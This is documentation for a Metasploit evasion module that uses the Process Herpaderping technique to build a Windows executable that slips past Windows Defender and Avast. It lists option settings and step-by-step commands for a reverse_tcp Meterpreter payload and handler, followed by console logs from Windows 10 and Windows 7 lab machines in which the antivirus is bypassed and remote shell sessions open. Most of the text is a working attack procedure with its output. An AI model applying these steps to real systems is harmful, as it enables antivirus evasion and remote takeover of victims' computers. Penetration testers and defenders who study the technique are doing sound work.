## Description
This module allows you to generate a Windows executable that evades security
products such as Windows Defender, Avast, etc. This uses the Process
Herpaderping technique to bypass Antivirus detection. This method consists in
obscuring the behavior of a running process by modifying the executable on disk
after the image has been mapped in memory (more details
[here](https://jxy-s.github.io/herpaderping/)).

First, the chosen payload is encrypted and embedded in a loader Portable
Executable (PE) file. This file is then included in the final executable. Once
this executable is launched on the target, the loader PE is dropped on disk and
executed, following the Process Herpaderping technique. Note that the name of
the file that is being dropped is randomly generated. However, it is possible
to configure the destination path from Metasploit (see `WRITEABLE_DIR` option
description).

Here is the main workflow:

1. Retrieve the target name (where the PE loader will be dropped).
1. Retrieve the PE loader from the binary and write it on disk.
1. Create a [section object](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views)
   and create a process from the mapped image.
1. Modify the file content on disk by copying another (inoffensive) executable
   or by using random bytes (see `REPLACED_WITH_FILE` option description).
1. Create the main Thread.

The source code is based on [Johnny Shaw](https://twitter.com/jxy__s)'s
[PoC](https://github.com/jxy-s/herpaderping).

**This payload won't work on 32-bit Windows 10 versions from 1511 (build
10586) to 1703 (build 15063), including Windows 10 2016 LTSB (build 14393).**
These versions have a bug in the kernel that crashes/BugCheck the OS
when executing this payload. So, to avoid this, the payload won't run if
it detects the OS is one of these versions. More details [here](https://bugs.chromium.org/p/project-zero/issues/detail?id=852).

## Verification Steps
Here are the steps using a Meterpreter payload on a 64-bits target:

1. Do: `use evasion/windows/process_herpaderping`
1. Do: `set LHOST <local IP>`
1. Do: `set target 0`
1. Do: `set payload windows/x64/meterpreter/reverse_tcp`
1. Do: `handler -p windows/x64/meterpreter/reverse_tcp -H <local IP> -P <local port>`
1. Do: `run`
1. Copy the generated executable file to the target (using another exploit or SMB)
1. Run it on the target
1. Verify the Antivirus did not block its execution
1. Verify you got a session

## Options

### ENCODER
A specific encoder to use (automatically selected if not set). Note that the
encoded payload will be automatically encrypted before being placed into the
loader.

### FILENAME
Filename for the generated evasive file file. The default is random.

### WRITEABLE_DIR
Where to write the loader on disk. Windows environment variables can be used
in the path and the default is set to `%TEMP%`. Note that this file will be
removed automatically when the session is terminated or if an error occurs.

### REPLACED_WITH_FILE
The file to replace the target with. If not set, the target file will be filled
with random bytes (WARNING! it is likely to be catched by AV). Windows
environment variables can be used in the path and the default is set to
`%SystemRoot%\\System32\\calc.exe`.


## Scenarios
### Windows 10 x64 version 1909 with Avast Antivirus (also tested with Windows Defender)
```
msf6 > use evasion/windows/process_herpaderping
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 evasion(windows/process_herpaderping) > set LHOST 192.168.144.1
LHOST => 192.168.144.1
msf6 evasion(windows/process_herpaderping) > set target 0
target => 0
msf6 evasion(windows/process_herpaderping) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 evasion(windows/process_herpaderping) > handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.144.1 -P 4444
[*] Payload handler running as background job 0.

[*] Started reverse TCP handler on 192.168.144.1:4444
msf6 evasion(windows/process_herpaderping) > run
[+] raU.exe stored at /home/msfuser/.msf4/local/raU.exe
msf6 evasion(windows/process_herpaderping) > cp /home/msfuser/.msf4/local/raU.exe /remote_share/tmp/test_x64.exe
[*] exec: cp /home/msfuser/.msf4/local/raU.exe /remote_share/tmp/test_x64.exe

msf6 evasion(windows/process_herpaderping) >
[*] Sending stage (200262 bytes) to 192.168.144.128
[*] Meterpreter session 1 opened (192.168.144.1:4444 -> 192.168.144.128:50205) at 2021-01-22 13:02:14 +0100

msf6 evasion(windows/process_herpaderping) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-UUQE0B4
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: DESKTOP-UUQE0B4\n00tmeg
meterpreter > [*] Shutting down Meterpreter...

[*] 192.168.144.128 - Meterpreter session 1 closed.  Reason: User exit
```

### Windows 7 x86 with Avast Antivirus
```
msf6 evasion(windows/process_herpaderping) > set target 1
target => 1
msf6 evasion(windows/process_herpaderping) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 evasion(windows/process_herpaderping) > options

Module options (evasion/windows/process_herpaderping):

   Name                Current Setting                 Required  Description
   ----                ---------------                 --------  -----------
   ENCODER                                             no        A specific encoder to use (automatically selected if not set)
   FILENAME            raU.exe                         yes       Filename for the evasive file (default: random)
   REPLACED_WITH_FILE  %SystemRoot%\System32\calc.exe  no        File to replace the target with. If not set, the target file will be filled with random bytes (WARNING! it is likely to be catched by AV).
   WRITEABLE_DIR       %TEMP%                          yes       Where to write the loader on disk


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.144.1    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Evasion target:

   Id  Name
   --  ----
   1   Microsoft Windows (x86)


msf6 evasion(windows/process_herpaderping) > run

[+] raU.exe stored at /home/msfuser/.msf4/local/raU.exe
[!] #### WARNING ####
This payload won't work on 32-bit Windows 10 versions from 1511 (build
10586) to 1703 (build 15063), including Windows 10 2016 LTSB (build 14393).
These versions have a bug in the kernel that crashes/BugCheck the OS
when executing this payload. So, to avoid this, the payload won't run if
it detects the OS is one of these versions.
msf6 evasion(windows/process_herpaderping) > cp /home/msfuser/.msf4/local/raU.exe /remote_share/tmp/test_x86.exe
[*] exec: cp /home/msfuser/.msf4/local/raU.exe /remote_share/tmp/test_x86.exe

msf6 evasion(windows/process_herpaderping) > jobs -K
Stopping all jobs...
msf6 evasion(windows/process_herpaderping) > handler -p windows/meterpreter/reverse_tcp -H 192.168.144.1 -P 4444
[*] Payload handler running as background job 1.

[*] Started reverse TCP handler on 192.168.144.1:4444
msf6 evasion(windows/process_herpaderping) > [*] Sending stage (175174 bytes) to 192.168.144.133
[*] Meterpreter session 3 opened (192.168.144.1:4444 -> 192.168.144.133:51542) at 2021-01-22 13:09:43 +0100

msf6 evasion(windows/process_herpaderping) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > sysinfo
Computer        : WIN7-DEV
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: WIN7-DEV\n00tmeg
meterpreter > [*] Shutting down Meterpreter...

[*] 192.168.144.133 - Meterpreter session 3 closed.  Reason: User exit
```
